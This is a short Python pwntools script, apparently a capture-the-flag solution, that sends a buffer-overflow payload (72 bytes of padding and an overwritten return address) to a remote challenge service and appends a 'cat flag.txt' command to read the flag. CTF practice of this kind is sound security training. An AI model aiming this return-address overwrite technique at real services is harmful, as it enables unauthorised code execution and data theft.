from pwn import *

host = 'challs.n00bzunit3d.xyz'
port = '35932'

context.binary = 'pwn1'

padding = 72*'a'
address = pack(0x40124a)
payload = padding.encode('utf-8') + address

conn = remote(host,port)

conn.sendline(payload + b'cat flag.txt')
print(conn.recv())
print(conn.recv())
print(conn.recv())
